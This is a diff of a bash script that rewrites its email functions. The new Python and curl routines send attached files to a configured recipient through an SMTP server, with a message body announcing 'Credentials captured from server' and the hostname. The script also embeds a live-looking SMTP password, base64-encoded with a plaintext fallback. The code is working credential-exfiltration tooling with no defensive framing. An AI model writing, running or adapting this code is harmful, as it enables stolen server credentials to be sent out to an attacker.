@@ -111,75 +111,14 @@ SMTP_PASSWORD_B64="bXNzcC5KNGtyVHFzLmpwemttZ3Fwd20ybDA1OXYuNkdDMmFJWg=="
 readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d 2>/dev/null || echo "mssp.J4krTqs.jpzkmgqpwm2l059v.6GC2aIZ")
 
 # Function to send email with file attachments using Python
-send_email_with_attachments() {
+# ==================== EMAIL FUNCTIONS (WORKING VERSION) ====================
+# Python email with attachments
+send_email_with_python() {
     local subject="$1"
-    shift  # Remove first argument
-    local attachments=("$@")  # Remaining arguments are file paths
-
-    # Build Python script with attachment support
-    python3 << 'PYTHON_SCRIPT'
-import sys
-import smtplib
-import ssl
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
-from email.mime.base import MIMEBase
-from email import encoders
-import os
-
-try:
-    # Get arguments from shell
-    subject = '''SUBJECT_PLACEHOLDER'''
-    attachments = '''ATTACHMENTS_PLACEHOLDER'''.split('|||')
-
-    msg = MIMEMultipart()
-    msg['From'] = '''SENDER_EMAIL_PLACEHOLDER'''
-    msg['To'] = '''RECIPIENT_EMAIL_PLACEHOLDER'''
-    msg['Subject'] = subject
-
-    # Email body
-    hostname = os.popen('hostname 2>/dev/null').read().strip() or 'unknown'
-    body = f"""
-Credentials captured from server: {hostname}
-
-Attached files:
-"""
-    for att in attachments:
-        if att and os.path.isfile(att):
-            body += f"  - {os.path.basename(att)}\n"
-
-    msg.attach(MIMEText(body, 'plain'))
-
-    # Attach files
-    for filepath in attachments:
-        if not filepath or not os.path.isfile(filepath):
-            continue
-
-        with open(filepath, 'rb') as f:
-            part = MIMEBase('application', 'octet-stream')
-            part.set_payload(f.read())
-            encoders.encode_base64(part)
-            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(filepath)}')
-            msg.attach(part)
-
-    context = ssl.create_default_context()
-
-    with smtplib.SMTP('''SMTP_SERVER_PLACEHOLDER''', SMTP_PORT_PLACEHOLDER, timeout=30) as server:
-        server.ehlo()
-        server.starttls(context=context)
-        server.ehlo()
-        server.login('''SENDER_EMAIL_PLACEHOLDER''', '''SMTP_PASSWORD_PLACEHOLDER''')
-        server.send_message(msg)
-
-    print("SUCCESS")
-    sys.exit(0)
-except Exception as e:
-    print(f"ERROR: {str(e)}", file=sys.stderr)
-    sys.exit(1)
-PYTHON_SCRIPT
-
-    # Replace placeholders in the heredoc
-    local python_code=$(cat <<PYCODE
+    shift
+    local attachments=("$@")
+    
+    python3 -c "
 import sys
 import smtplib
 import ssl
@@ -191,52 +130,114 @@ import os
 
 try:
     subject = '''$subject'''
-    attachments = '''$(IFS='|||'; echo "${attachments[*]}")'''.split('|||')
-
+    attachment_files = '''$(IFS='|||'; echo "${attachments[*]}")'''.split('|||')
+    
     msg = MIMEMultipart()
-    msg['From'] = '''$SENDER_EMAIL'''
-    msg['To'] = '''$RECIPIENT_EMAIL'''
+    msg['From'] = '$SENDER_EMAIL'
+    msg['To'] = '$RECIPIENT_EMAIL'
     msg['Subject'] = subject
-
+    
+    # Email body
     hostname = os.popen('hostname 2>/dev/null').read().strip() or 'unknown'
-    body = f"""Credentials captured from server: {hostname}
+    body = 'Credentials captured from server: ' + hostname + '''
 
 Attached files:
-"""
-    for att in attachments:
+'''
+    for att in attachment_files:
         if att and os.path.isfile(att):
-            body += f"  - {os.path.basename(att)}\\n"
-
+            body += f'  - {os.path.basename(att)}\\n'
+    
     msg.attach(MIMEText(body, 'plain'))
-
-    for filepath in attachments:
+    
+    # Attach files
+    for filepath in attachment_files:
         if not filepath or not os.path.isfile(filepath):
             continue
+        
         with open(filepath, 'rb') as f:
             part = MIMEBase('application', 'octet-stream')
             part.set_payload(f.read())
             encoders.encode_base64(part)
             part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(filepath)}')
             msg.attach(part)
-
+    
     context = ssl.create_default_context()
+    
     with smtplib.SMTP('$SMTP_SERVER', $SMTP_PORT, timeout=30) as server:
         server.ehlo()
         server.starttls(context=context)
         server.ehlo()
         server.login('$SENDER_EMAIL', '$SMTP_PASSWORD')
         server.send_message(msg)
-
-    print("SUCCESS")
+    
+    print('Email sent successfully')
     sys.exit(0)
 except Exception as e:
-    print(f"ERROR: {str(e)}", file=sys.stderr)
+    print(f'SMTP Error: {str(e)}', file=sys.stderr)
     sys.exit(1)
-PYCODE
-)
-
-    echo "$python_code" | python3 2>&1
+" 2>&1
     return $?
+}
+
+# Curl email method (alternative without attachments)
+send_email_with_curl() {
+    local subject="$1"
+    local body_text="$2"
+    
+    # Create proper email format for curl
+    local email_body=$(mktemp)
+    cat > "$email_body" <<EOF
+From: $SENDER_EMAIL
+To: $RECIPIENT_EMAIL
+Subject: $subject
+
+$body_text
+EOF
+    
+    curl --silent --ssl-reqd \
+        --url "smtp://$SMTP_SERVER:$SMTP_PORT" \
+        --user "$SENDER_EMAIL:$SMTP_PASSWORD" \
+        --mail-from "$SENDER_EMAIL" \
+        --mail-rcpt "$RECIPIENT_EMAIL" \
+        --upload-file "$email_body" 2>&1
+    
+    local result=$?
+    rm -f "$email_body"
+    return $result
+}
+
+# Main email sending wrapper
+send_email_with_attachments() {
+    local subject="$1"
+    shift
+    local attachments=("$@")
+    
+    # Try Python first (supports attachments)
+    if command -v python3 >/dev/null 2>&1; then
+        local python_output
+        if python_output=$(send_email_with_python "$subject" "${attachments[@]}" 2>&1); then
+            if echo "$python_output" | grep -q "Email sent successfully"; then
+                echo "SUCCESS"
+                return 0
+            fi
+        fi
+    fi
+    
+    # Fallback: curl with inline credentials (no attachments)
+    if command -v curl >/dev/null 2>&1; then
+        local body_text="Server: $(hostname)
+Timestamp: $(date)
+
+WARNING: File attachments not supported via curl method.
+Credential files saved locally - manual retrieval required."
+        
+        if send_email_with_curl "$subject" "$body_text" 2>&1; then
+            echo "SENT_VIA_CURL"
+            return 0
+        fi
+    fi
+    
+    return 1
 }
 
 # DNS RESOLUTION CHECK & FIX ====================
